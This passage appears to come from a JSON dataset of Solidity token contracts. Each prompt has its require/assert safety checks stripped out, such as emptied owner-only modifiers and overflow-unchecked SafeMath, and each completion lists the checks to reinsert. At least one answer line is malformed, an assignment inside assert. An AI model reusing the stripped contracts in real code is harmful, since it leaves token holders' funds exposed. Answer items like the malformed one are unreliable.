>= qnt10k.mul(9) && tokens < qnt10k.mul(10)){\n195           bonusPrice = 4097391304347830;\n196         }else if(tokens >= qnt10k.mul(8) && tokens < qnt10k.mul(9)){\n197           bonusPrice = 4229565217391300;\n198         }else if(tokens >= qnt10k.mul(7) && tokens < qnt10k.mul(8)){\n199           bonusPrice = 4361739130434780;\n200         }else if(tokens >= qnt10k.mul(6) && tokens < qnt10k.mul(7)){\n201           bonusPrice = 4493913043478260;\n202         }else if(tokens >= qnt10k.mul(5) && tokens < qnt10k.mul(6)){\n203           bonusPrice = 4626086956521740;\n204         }else{\n205           bonusPrice = 5286956521739130;\n206         }\n207       }else if(endBlockBonus2 >= getBlockNumber()){\n208         if(tokens == qnt10k.mul(19) ){\n209           bonusPrice = 3436521739130430;\n210         }else if(tokens >= qnt10k.mul(18) && tokens < qnt10k.mul(19)){\n211           bonusPrice = 3568695652173910;\n212         }else if(tokens >= qnt10k.mul(17) && tokens < qnt10k.mul(18)){\n213           bonusPrice = 3700869565217390;\n214         }else if(tokens >= qnt10k.mul(16) && tokens < qnt10k.mul(17)){\n215           bonusPrice = 3833043478260870;\n216         }else if(tokens >= qnt10k.mul(15) && tokens < qnt10k.mul(16)){\n217           bonusPrice = 3965217391304350;\n218         }else if(tokens >= qnt10k.mul(14) && tokens < qnt10k.mul(15)){\n219           bonusPrice = 4097391304347830;\n220         }else if(tokens >= qnt10k.mul(13) && tokens < qnt10k.mul(14)){\n221           bonusPrice = 4229565217391300;\n222         }else if(tokens >= qnt10k.mul(12) && tokens < qnt10k.mul(13)){\n223           bonusPrice = 4361739130434780;\n224         }else if(tokens >= qnt10k.mul(11) && tokens < qnt10k.mul(12)){\n225           bonusPrice = 4493913043478260;\n226         }else if(tokens >= qnt10k.mul(10) && tokens < qnt10k.mul(11)){\n227           bonusPrice = 4626086956521740;\n228         }else if(tokens >= qnt10k.mul(9) && tokens < qnt10k.mul(10)){\n229           bonusPrice = 4758260869565220;\n230         }else if(tokens >= qnt10k.mul(8) && tokens < qnt10k.mul(9)){\n231           bonusPrice = 4890434782608700;\n232         }else if(tokens >= qnt10k.mul(7) && tokens < qnt10k.mul(8)){\n233           bonusPrice = 5022608695652170;\n234         }else if(tokens >= qnt10k.mul(6) && tokens < qnt10k.mul(7)){\n235           bonusPrice = 5154782608695650;\n236         }else if(tokens >= qnt10k.mul(5) && tokens < qnt10k.mul(6)){\n237           bonusPrice = 5286956521739130;\n238         }else{\n239           bonusPrice = 5947826086956520;\n240         }\n241       }else{\n242         if(tokens == qnt10k.mul(19) ){\n243           bonusPrice = 3766956521739130;\n244         }else if(tokens >= qnt10k.mul(18) && tokens < qnt10k.mul(19)){\n245           bonusPrice = 3899130434782610;\n246         }else if(tokens >= qnt10k.mul(17) && tokens < qnt10k.mul(18)){\n247           bonusPrice = 4031304347826090;\n248         }else if(tokens >= qnt10k.mul(16) && tokens < qnt10k.mul(17)){\n249           bonusPrice = 4163478260869570;\n250         }else if(tokens >= qnt10k.mul(15) && tokens < qnt10k.mul(16)){\n251           bonusPrice = 4295652173913040;\n252         }else if(tokens >= qnt10k.mul(14) && tokens < qnt10k.mul(15)){\n253           bonusPrice = 4427826086956520;\n254         }else if(tokens >= qnt10k.mul(13) && tokens < qnt10k.mul(14)){\n255           bonusPrice = 4560000000000000;\n256         }else if(tokens >= qnt10k.mul(12) && tokens < qnt10k.mul(13)){\n257           bonusPrice = 4692173913043480;\n258         }else if(tokens >= qnt10k.mul(11) && tokens < qnt10k.mul(12)){\n259           bonusPrice = 4824347826086960;\n260         }else if(tokens >= qnt10k.mul(10) && tokens < qnt10k.mul(11)){\n261           bonusPrice = 4956521739130430;\n262         }else if(tokens >= qnt10k.mul(9) && tokens < qnt10k.mul(10)){\n263           bonusPrice = 5088695652173910;\n264         }else if(tokens >= qnt10k.mul(8) && tokens < qnt10k.mul(9)){\n265           bonusPrice = 5220869565217390;\n266         }else if(tokens >= qnt10k.mul(7) && tokens < qnt10k.mul(8)){\n267           bonusPrice = 5353043478260870;\n268         }else if(tokens >= qnt10k.mul(6) && tokens < qnt10k.mul(7)){\n269           bonusPrice = 5485217391304350;\n270         }else if(tokens >= qnt10k.mul(5) && tokens < qnt10k.mul(6)){\n271           bonusPrice = 5617391304347830;\n272         }else{\n273           bonusPrice = 6278260869565220;\n274         }\n275       }\n\n276       tokens = weiAmount.mul(10**18).div(bonusPrice);\n\n277       require(pylonSelled + tokens <= bonusCap); // Check if want to sell more than total tokens for pre-ico\n278       require(balanceOf[investor] + tokens <= maxTokens); // Check if the investor has more tokens than 5% of total supply\n279       require(balanceOf[this] >= tokens);             // checks if it has enough to sell\n\n280       balanceOf[this] -= tokens;\n281       balanceOf[investor] += tokens;\n282       amountRaised += weiAmount; // update state amount raised\n283       pylonSelled += tokens; // Total tokens selled\n\n284       beneficiary.transfer(weiAmount); //Transfer ethers to beneficiary\n\n285       frozenAccount[investor] = true;\n286       FrozenFunds(investor, true);\n\n287       TokenPurchase(msg.sender, investor, weiAmount, tokens);\n\n288     }\n\n289     modifier afterDeadline() { if (now >= deadline) _; }\n\n290     /**\n291      * Check if goal was reached\n292      *\n293      * Checks if the goal or time limit has been reached and ends the campaign\n294      */\n295     function checkGoalReached() afterDeadline onlyOwner {\n296         if (amountRaised >= fundingGoal){\n297             fundingGoalReached = true;\n298             GoalReached(beneficiary, amountRaised);\n299         }\n300         crowdsaleClosed = true;\n301     }\n\n\n302     // @return true if the transaction can buy tokens\n303     function validPurchase() internal constant returns (bool) {\n304         uint256 current = getBlockNumber();\n305         bool withinPeriod = current >= startBlock && current <= deadline;\n306         bool nonZeroPurchase = msg.value != 0;\n307         return withinPeriod && nonZeroPurchase;\n308     }\n\n309     //////////\n310     // Testing specific methods\n311     //////////\n\n312     /// @notice This function is overridden by the test Mocks.\n313     function getBlockNumber() internal constant returns (uint256) {\n314         return block.number;\n315     }\n\n316     /// @notice Pauses the contribution if there is any issue\n317     function pauseContribution() onlyOwner {\n318         paused = true;\n319     }\n\n320     /// @notice Resumes the contribution\n321     function resumeContribution() onlyOwner {\n322         paused = false;\n323     }\n324 }\n325 /**\n326  * @title SafeMath\n327  * @dev Math operations with safety checks that throw on error\n328  */\n329 library SafeMath {\n330   function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n331     uint256 c = a * b;\n332     assert(a == 0 || c / a == b);\n333     return c;\n334   }\n\n335   function div(uint256 a, uint256 b) internal constant returns (uint256) {\n336     // assert(b > 0); // Solidity automatically throws when dividing by 0\n337     uint256 c = a / b;\n338     // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n339     return c;\n340   }\n\n341   function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n342     assert(b <= a);\n343     return a - b;\n344   }\n\n345   function add(uint256 a, uint256 b) internal constant returns (uint256) {\n346     uint256 c = a + b;\n347     assert(c >= a);\n348     return c;\n349   }\n350 }",
        "completion": "12+         require(msg.sender == owner);\n63+         require(!paused);\n101+         require(_to != 0x0);                             \n102+         require(balanceOf[_from] >= _value);                \n103+         require(balanceOf[_to] + _value > balanceOf[_to]);  \n104+         require(!frozenAccount[_from]);                     \n105+         require(!frozenAccount[_to]);   \n140+         require(investor != 0x0);  \n141+         require(validPurchase()); \n142+         require(maxEtherInvestment >= msg.value); \n143+        require(balanceOf[investor] <= maxTokens); \n144+         require(amountRaised <= fundingGoal); \n145+         require(pylonSelled <= totalTokensToSend); \n157+       require((balanceOf[investor] + tokens) <= maxTokens);    \n158+       require(balanceOf[this] >= tokens);           \n159+       require(pylonSelled + tokens <= totalTokensToSend);\n277+       require(pylonSelled + tokens <= bonusCap); \n278+      require(balanceOf[investor] + tokens <= maxTokens); \n332+    assert(a == 0 || c / a == b);\n342+     assert(b <= a);\n347+     assert(c >= a);"
    },
    {
        "prompt": "\n1 pragma solidity ^0.4.2;\n2 contract owned {\n3     address public owner;\n\n4     function owned() {\n5         owner = msg.sender;\n6     }\n\n7     modifier onlyOwner {\n\n8         if (msg.sender != owner) throw;\n9         _;\n10     }\n\n11     function transferOwnership(address newOwner) onlyOwner {\n12         owner = newOwner;\n13     }\n14 }\n\n15 contract tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData); }\n\n16 contract token {\n17     /* Public variables of the token */\n18     string public standard = 'Token 0.1';\n19     string public name;\n20     string public symbol;\n21     uint8 public decimals;\n22     uint256 public totalSupply;\n\n23     /* This creates an array with all balances */\n24     mapping (address => uint256) public balanceOf;\n25     mapping (address => mapping (address => uint256)) public allowance;\n\n26     /* This generates a public event on the blockchain that will notify clients */\n27     event Transfer(address indexed from, address indexed to, uint256 value);\n\n28     /* Initializes contract with initial supply tokens to the creator of the contract */\n29     function token(\n30         uint256 initialSupply,\n31         string tokenName,\n32         uint8 decimalUnits,\n33         string tokenSymbol\n34         ) {\n35         balanceOf[msg.sender] = initialSupply;              // Give the creator all initial tokens\n36         totalSupply = initialSupply;                        // Update total supply\n37         name = tokenName;                                   // Set the name for display purposes\n38         symbol = tokenSymbol;                               // Set the symbol for display purposes\n39         decimals = decimalUnits;                            // Amount of decimals for display purposes\n40     }\n\n41     function transfer(address _to, uint256 _value) {\n42         if (balanceOf[msg.sender] < _value) throw;           // Check if the sender has enough\n43         if (balanceOf[_to] + _value < balanceOf[_to]) throw; // Check for overflows\n44         balanceOf[msg.sender] -= _value;                     // Subtract from the sender\n45         balanceOf[_to] += _value;                            // Add the same to the recipient\n46         Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place\n47     }\n\n48     /* Allow another contract to spend some tokens in your behalf */\n49     function approve(address _spender, uint256 _value)\n50         returns (bool success) {\n51         allowance[msg.sender][_spender] = _value;\n52         return true;\n53     }\n\n\n54     function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n55         returns (bool success) {    \n56         tokenRecipient spender = tokenRecipient(_spender);\n57         if (approve(_spender, _value)) {\n58             spender.receiveApproval(msg.sender, _value, this, _extraData);\n59             return true;\n60         }\n61     }\n\n62     /* A contract attempts to get the coins */\n63     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n64         if (balanceOf[_from] < _value) throw;                 // Check if the sender has enough\n65         if (balanceOf[_to] + _value < balanceOf[_to]) throw;  // Check for overflows\n66         if (_value > allowance[_from][msg.sender]) throw;   // Check allowance\n67         balanceOf[_from] -= _value;                          // Subtract from the sender\n68         balanceOf[_to] += _value;                            // Add the same to the recipient\n69         allowance[_from][msg.sender] -= _value;\n70         Transfer(_from, _to, _value);\n71         return true;\n72     }\n\n73     /* This unnamed function is called whenever someone tries to send ether to it */\n74     function () {\n75         throw;     // Prevents accidental sending of ether\n76     }\n77 }\n\n78 contract SwftCoin is owned, token {\n\n79     uint256 public sellPrice;\n80     uint256 public buyPrice;\n\n81     mapping (address => bool) public frozenAccount;\n\n\n82     event FrozenFunds(address target, bool frozen);\n\n83     /* Initializes contract with initial supply tokens to the creator of the contract */\n84     function SwftCoin(\n85         uint256 initialSupply,\n86         string tokenName,\n87         uint8 decimalUnits,\n88         string tokenSymbol\n89     ) token (initialSupply, tokenName, decimalUnits, tokenSymbol) {}\n\n90     /* Send coins */\n91     function transfer(address _to, uint256 _value) {\n92         if (balanceOf[msg.sender] < _value) throw;           // Check if the sender has enough\n93         if (balanceOf[_to] + _value < balanceOf[_to]) throw; // Check for overflows\n94         if (frozenAccount[msg.sender]) throw;                // Check if frozen\n95         balanceOf[msg.sender] -= _value;                     // Subtract from the sender\n96         balanceOf[_to] += _value;                            // Add the same to the recipient\n97         Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place\n98     }\n\n99     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n100         if (frozenAccount[_from]) throw;                        // Check if frozen            \n101         if (balanceOf[_from] < _value) throw;                 // Check if the sender has enough\n102         if (balanceOf[_to] + _value < balanceOf[_to]) throw;  // Check for overflows\n103         if (_value > allowance[_from][msg.sender]) throw;   // Check allowance\n104         balanceOf[_from] -= _value;                          // Subtract from the sender\n105         balanceOf[_to] += _value;                            // Add the same to the recipient\n106         allowance[_from][msg.sender] -= _value;\n107         Transfer(_from, _to, _value);\n108         return true;\n109     }\n\n110     function mintToken(address target, uint256 mintedAmount) onlyOwner {\n111         balanceOf[target] += mintedAmount;\n112         totalSupply += mintedAmount;\n113         Transfer(0, this, mintedAmount);\n114         Transfer(this, target, mintedAmount);\n115     }\n\n116     function freezeAccount(address target, bool freeze) onlyOwner {\n117         frozenAccount[target] = freeze;\n118         FrozenFunds(target, freeze);\n119     }\n\n120     function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner {\n121         sellPrice = newSellPrice;\n122         buyPrice = newBuyPrice;\n123     }\n\n124     function buy() payable {\n125         uint amount = msg.value / buyPrice;                // calculates the amount\n126         if (balanceOf[this] < amount) throw;               // checks if it has enough to sell\n127         balanceOf[msg.sender] += amount;                   // adds the amount to buyer's balance\n128         balanceOf[this] -= amount;                         // subtracts amount from seller's balance\n129         Transfer(this, msg.sender, amount);                // execute an event reflecting the change\n130     }\n\n131     function sell(uint256 amount) {\n132         if (balanceOf[msg.sender] < amount ) throw;        // checks if the sender has enough to sell\n133         balanceOf[this] += amount;                         // adds the amount to owner's balance\n134         balanceOf[msg.sender] -= amount;                   // subtracts the amount from seller's balance\n135         if (!msg.sender.send(amount * sellPrice)) {        // sends ether to the seller. It's important\n136             throw;                                         // to do this last to avoid recursion attacks\n137         } else {\n138             Transfer(msg.sender, this, amount);            // executes an event reflecting on the change\n139         }               \n140     }\n141 }",
        "completion": "7+  assert(msg.sender == owner);\n125+ assert(balanceOf[this] >= amount);\n131+assert(balanceOf[msg.sender] >= amount );"
    },
    {
        "prompt": "1 pragma solidity ^0.4.11;\n\n2 contract Token {\n3     uint256 public totalSupply;\n4     function balanceOf(address _owner) constant returns (uint256 balance);\n5     function transfer(address _to, uint256 _value) returns (bool success);\n6     function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n7     function approve(address _spender, uint256 _value) returns (bool success);\n8     function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n9     event Transfer(address indexed _from, address indexed _to, uint256 _value);\n10     event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n11 }\n\n12 contract StandardToken is Token {\n13 \tbool public disabled = false;\n14     function transfer(address _to, uint256 _value) returns (bool success) {\n15         if (disabled != true && balances[msg.sender] >= _value && _value > 0) {\n16             balances[msg.sender] -= _value;\n17             balances[_to] += _value;\n18             Transfer(msg.sender, _to, _value);\n19             return true;\n20         } else { return false; }\n21     }\n22     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n23         if (disabled != true && balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n24             balances[_to] += _value;\n25             balances[_from] -= _value;\n26             allowed[_from][msg.sender] -= _value;\n27             Transfer(_from, _to, _value);\n28             return true;\n29         } else { return false; }\n30     }\n31     function balanceOf(address _owner) constant returns (uint256 balance) {\n32         return balances[_owner];\n33     }\n34     function approve(address _spender, uint256 _value) returns (bool success) {\n35         allowed[msg.sender][_spender] = _value;\n36         Approval(msg.sender, _spender, _value);\n37         return true;\n38     }\n39     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n40       return allowed[_owner][_spender];\n41     }\n42     mapping (address => uint256) balances;\n43     mapping (address => mapping (address => uint256)) allowed;\n44 }\n\n45 contract NexxusToken is StandardToken {\n\n46     function () {return;}\n\n47     string public name = \"Nexxus\";\n48     uint8 public decimals = 8;\n49     string public symbol = \"NXX\";\n50     address public owner;\n\n51     function NexxusToken() {\n52         totalSupply = 31800000000000000;\n53         owner = msg.sender;\n54         balances[owner] = totalSupply;\n55     }\n56     function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n57         allowed[msg.sender][_spender] = _value;\n58         Approval(msg.sender, _spender, _value);\n59         if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { return; }\n60         return true;\n61     }\n62 \tfunction mintToken(uint256 _amount) {\n63         if (msg.sender == owner) {\n64     \t\ttotalSupply += _amount;\n65             balances[owner] += _amount;\n66     \t\tTransfer(0, owner, _amount);\n67         }\n68 \t}\n69 \tfunction disableToken(bool _disable) { \n70         if (msg.sender == owner)\n71 \t\t\tdisabled = _disable;\n72     }\n73 }",
        "completion": "12+ assert(!disabled);\n22+ assert(!disabled);  \n22+ assert(balances[_from] >= _value);\n22+ assert(allowed[_from][msg.sender] >= _value && _value > 0);\n62+ assert(msg.sender == owner);\n69+ assert(msg.sender == owner);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.24;\n\n\n2 contract SafeMath {\n\n3     function safeAdd(uint a, uint b) public pure returns (uint c) {\n4         c = a + b;\n\n5     }\n\n6     function safeSub(uint a, uint b) public pure returns (uint c) {      \n7         c = a - b;\n8     }\n\n9     function safeMul(uint a, uint b) public pure returns (uint c) {\n10         c = a * b;      \n11     }\n\n12     function safeDiv(uint a, uint b) public pure returns (uint c) {      \n13         c = a / b;\n14     }\n15 }\n\n16 contract ERC20Interface {\n17     function totalSupply() public constant returns (uint);\n18     function balanceOf(address tokenOwner) public constant returns (uint balance);\n19     function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n20     function transfer(address to, uint tokens) public returns (bool success);\n21     function approve(address spender, uint tokens) public returns (bool success);\n22     function transferFrom(address from, address to, uint tokens) public returns (bool success);\n\n23     event Transfer(address indexed from, address indexed to, uint tokens);\n24     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n25 }\n\n\n\n26 contract ApproveAndCallFallBack {\n27     function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n28 }\n\n\n29 contract IAMToken is ERC20Interface, SafeMath {\n30     string public symbol;\n31     string public  name;\n32     uint8 public decimals;\n33     uint public _totalSupply;\n\n34     mapping(address => uint) balances;\n35     mapping(address => mapping(address => uint)) allowed;\n\n\n36     constructor() public {\n37         symbol = \"IAM\";\n38         name = \"IAMEMILIANO\";\n39         decimals = 2;\n40         _totalSupply = 100000000000;\n41         balances[0x4a460B1Be30c04EB904868fA5292ba8f6Ae2B740] = _totalSupply;\n42         emit Transfer(address(0), 0x4a460B1Be30c04EB904868fA5292ba8f6Ae2B740, _totalSupply);\n43     }\n\n\n\n44     function totalSupply() public constant returns (uint) {\n45         return _totalSupply  - balances[address(0)];\n46     }\n\n\n\n47     function balanceOf(address tokenOwner) public constant returns (uint balance) {\n48         return balances[tokenOwner];\n49     }\n\n\n50     function transfer(address to, uint tokens) public returns (bool success) {\n51         balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n52         balances[to] = safeAdd(balances[to], tokens);\n53         emit Transfer(msg.sender, to, tokens);\n54         return true;\n55     }\n\n\n\n56     function approve(address spender, uint tokens) public returns (bool success) {\n57         allowed[msg.sender][spender] = tokens;\n58         emit Approval(msg.sender, spender, tokens);\n59         return true;\n60     }\n\n\n\n61     function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n62         balances[from] = safeSub(balances[from], tokens);\n63         allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n64         balances[to] = safeAdd(balances[to], tokens);\n65         emit Transfer(from, to, tokens);\n66         return true;\n67     }\n\n\n\n68     function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n69         return allowed[tokenOwner][spender];\n70     }\n\n\n71     function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n72         allowed[msg.sender][spender] = tokens;\n73         emit Approval(msg.sender, spender, tokens);\n74         ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n75         return true;\n76     }",
        "completion": "4+  require(c >= a);\n6+ require(b <= a);\n10+ require(a == 0 || c / a == b);\n12+  require(b > 0);\n71+ assert(allowed[msg.sender][spender] = tokens); "
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n\n2 contract ERC20Interface {\n3     function totalSupply() public view returns (uint);\n4     function balanceOf(address tokenOwner) public view returns (uint balance);\n5     function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n6     function transfer(address to, uint tokens) public returns (bool success);\n7     function approve(address spender, uint tokens) public returns (bool success);\n8     function transferFrom(address from, address to, uint tokens) public returns (bool success);\n\n9     event Transfer(address indexed from, address indexed to, uint tokens);\n10     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n11 }\n\n\n\n12 contract SafeMath {\n13     function safeAdd(uint a, uint b) public pure returns (uint c) {\n14         c = a + b;\n15         require(c >= a);\n16     }\n \n17 function safeSub(uint a, uint b) public pure returns (uint c) {\n18         require(b <= a); \n19         c = a - b; } \n\n20 function safeMul(uint a, uint b) public pure returns (uint c) { \n21         c = a * b; \n22  } \n\n23 function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n24         c = a / b;\n25     }\n26 }\n\n\n27 contract AlloHash is ERC20Interface, SafeMath {\n28     string public name;\n29     string public symbol;\n30     uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n\n31     uint256 public _totalSupply;\n\n32     mapping(address => uint) balances;\n33     mapping(address => mapping(address => uint)) allowed;\n\n  \n34     constructor() public {\n35         name = \"AlloHash\";\n36         symbol = \"ALH\";\n37         decimals = 18;\n38         _totalSupply = 180000000000000000000000000;\n\n39         balances[msg.sender] = _totalSupply;\n40         emit Transfer(address(0), msg.sender, _totalSupply);\n41     }\n\n42     function totalSupply() public view returns (uint) {\n43         return _totalSupply  - balances[address(0)];\n44     }\n\n45     function balanceOf(address tokenOwner) public view returns (uint balance) {\n46         return balances[tokenOwner];\n47     }\n\n48     function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n49         return allowed[tokenOwner][spender];\n50     }\n\n51     function approve(address spender, uint tokens) public returns (bool success) {\n52         allowed[msg.sender][spender] = tokens;\n53         emit Approval(msg.sender, spender, tokens);\n54         return true;\n55     }\n\n56     function transfer(address to, uint tokens) public returns (bool success) {\n57         balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n58         balances[to] = safeAdd(balances[to], tokens);\n59         emit Transfer(msg.sender, to, tokens);\n60         return true;\n61     }\n\n62     function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n63         balances[from] = safeSub(balances[from], tokens);\n64         allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n65         balances[to] = safeAdd(balances[to], tokens);\n66         emit Transfer(from, to, tokens);\n67         return true;\n68     }\n69 }",
        "completion": "15+ require(c >= a);\n17+ require(b <= a);\n21+ require(a == 0 || c / a == b);\n"
    },
    {
        "prompt": "1 pragma solidity ^0.4.4;\n\n2 contract Token {\n\n3     function totalSupply() constant returns (uint256 supply) {}\n4     function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n5     function transfer(address _to, uint256 _value) returns (bool success) {}\n\n6     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n  \n7     function approve(address _spender, uint256 _value) returns (bool success) {}\n\n\n8     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n9     event Transfer(address indexed _from, address indexed _to, uint256 _value);\n10     event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n11 }\n\n\n\n12 contract StandardToken is Token {\n\n13     function transfer(address _to, uint256 _value) returns (bool success) {\n   \n14         if (balances[msg.sender] >= _value && _value > 0) {\n15             balances[msg.sender] -= _value;\n16             balances[_to] += _value;\n17             Transfer(msg.sender, _to, _value);\n18             return true;\n19         } else { return false; }\n20     }\n\n21     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n   \n22         if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n23             balances[_to] += _value;\n24             balances[_from] -= _value;\n25             allowed[_from][msg.sender] -= _value;\n26             Transfer(_from, _to, _value);\n27             return true;\n28         } else { return false; }\n29     }\n\n30     function balanceOf(address _owner) constant returns (uint256 balance) {\n31         return balances[_owner];\n32     }\n\n33     function approve(address _spender, uint256 _value) returns (bool success) {\n34         allowed[msg.sender][_spender] = _value;\n35         Approval(msg.sender, _spender, _value);\n36         return true;\n37     }\n\n38     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n39         return allowed[_owner][_spender];\n40     }\n\n41     mapping (address => uint256) balances;\n42     mapping (address => mapping (address => uint256)) allowed;\n43     uint256 public totalSupply;\n44 }\n\n45 contract ERC20Token is StandardToken {\n\n46     function () {\n47         //if ether is sent to this address, send it back.\n48         throw;\n49     }\n\n   \n\n50     function ERC20Token(\n51         ) {\n52         balances[msg.sender] = 85000000000000;               // Give the creator all initial tokens (100000 for example)\n53         totalSupply = 85000000000000;                        // Update total supply (100000 for example)\n54         name = \"GAIN CHAIN\";                                   // Set the name for display purposes\n55         decimals = 8;                            // Amount of decimals\n56         symbol = \"GAIN\";                               // Set the symbol for display purposes\n57     }\n\n\n58     function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n59         allowed[msg.sender][_spender] = _value;\n60         Approval(msg.sender, _spender, _value);\n\n61         //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n62         //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n63         //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n64         if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n65         return true;\n66     }",
        "completion": "13+ assert(balances[msg.sender] >= _value);\n13+ assert( _value > 0); \n"
    },
    {
        "prompt": "1 pragma solidity ^0.4.24;\n\n\n2 contract ERC20Basic {\n3     function totalSupply() public view returns (uint256);\n4     function balanceOf(address who) public view returns (uint256);\n5     function transfer(address to, uint256 value) public returns (bool);\n6     event Transfer(address indexed from, address indexed to, uint256 value);\n7 }\n\n8 contract ERC20 is ERC20Basic {\n9     function allowance(address owner, address spender) public view returns (uint256);\n10     function transferFrom(address from, address to, uint256 value) public returns (bool);\n11     function approve(address spender, uint256 value) public returns (bool); \n12     event Approval(address indexed owner, address indexed spender, uint256 value);\n13 }\n\n14 contract BasicToken is ERC20Basic {\n15     using SafeMath for uint256;\n\n16     mapping(address => uint256) balances;\n\n17     uint256 totalSupply_;\n\n18     function totalSupply() public view returns (uint256) {\n19         return totalSupply_;\n20     }\n\n21     function transfer(address _to, uint256 _value) public returns (bool) {\n\n22         balances[msg.sender] = balances[msg.sender].sub(_value);\n23         balances[_to] = balances[_to].add(_value);\n    \n24         emit Transfer(msg.sender, _to, _value);\n25         return true;\n26     }\n\n27     function balanceOf(address _owner) public view returns (uint256) {\n28         return balances[_owner];\n29     }\n30 }\n\n31 contract Ownable {\n\n32     address public owner;\n33     address public operator;\n\n34     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n35     event OperatorTransferred(address indexed previousOperator, address indexed newOperator);\n\n36     constructor() public {\n37         owner    = msg.sender;\n38         operator = msg.sender;\n39     }\n\n40     modifier onlyOwner() { \n41          _; }\n42     modifier onlyOwnerOrOperator() {      \n43            _; }\n\n44     function transferOwnership(address _newOwner) external onlyOwner {      \n45         emit OwnershipTransferred(owner, _newOwner);\n46         owner = _newOwner;\n47     }\n  \n48     function transferOperator(address _newOperator) external onlyOwner { \n49         emit OperatorTransferred(operator, _newOperator);\n50         operator = _newOperator;\n51     }\n52 }\n\n53 contract BlackList is Ownable {\n\n54     event Lock(address indexed LockedAddress);\n55     event Unlock(address indexed UnLockedAddress);\n\n56     mapping( address => bool ) public blackList;\n\n57     modifier CheckBlackList {    \n58         _; }\n\n59     function SetLockAddress(address _lockAddress) external onlyOwnerOrOperator returns (bool) { \n        \n60         blackList[_lockAddress] = true;\n        \n61         emit Lock(_lockAddress);\n\n62         return true;\n63     }\n\n64     function UnLockAddress(address _unlockAddress) external onlyOwner returns (bool) {      \n        \n65         blackList[_unlockAddress] = false;\n        \n66         emit Unlock(_unlockAddress);\n\n67         return true;\n68     }\n69 }\n\n70 contract Pausable is Ownable {\n71     event Pause();\n72     event Unpause();\n\n73     bool public paused = false;\n\n74     modifier whenNotPaused() { require(!paused); _; }\n75     modifier whenPaused() { require(paused); _; }\n\n76     function pause() onlyOwnerOrOperator whenNotPaused public {\n77         paused = true;\n78         emit Pause();\n79     }\n\n80     function unpause() onlyOwner whenPaused public {\n81         paused = false;\n82         emit Unpause();\n83     }\n84 }\n\n85 contract StandardToken is ERC20, BasicToken {\n  \n86     mapping (address => mapping (address => uint256)) internal allowed;\n\n87     function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n        \n88         balances[_from] = balances[_from].sub(_value);\n89         balances[_to] = balances[_to].add(_value);\n90         allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n    \n91         emit Transfer(_from, _to, _value);\n92         emit Approval(_from, msg.sender, allowed[_from][msg.sender]);\n    \n93         return true;\n94     }\n\n95     function approve(address _spender, uint256 _value) public returns (bool) {\n96         allowed[msg.sender][_spender] = _value;\n    \n97         emit Approval(msg.sender, _spender, _value);\n    \n98         return true;\n99     }\n\n100     function allowance(address _owner, address _spender) public view returns (uint256) {\n101         return allowed[_owner][_spender];\n102     }\n\n103     function increaseApproval(address _spender, uint256 _addedValue) public returns (bool) {\n104         allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));\n    \n105         emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n    \n106         return true;\n107     }\n\n108     function decreaseApproval(address _spender, uint256 _subtractedValue) public returns (bool) {\n109         uint256 oldValue = allowed[msg.sender][_spender];\n    \n110         if (_subtractedValue > oldValue) {\n111             allowed[msg.sender][_spender] = 0;\n112         } else {\n113             allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n114         }\n    \n115         emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n116    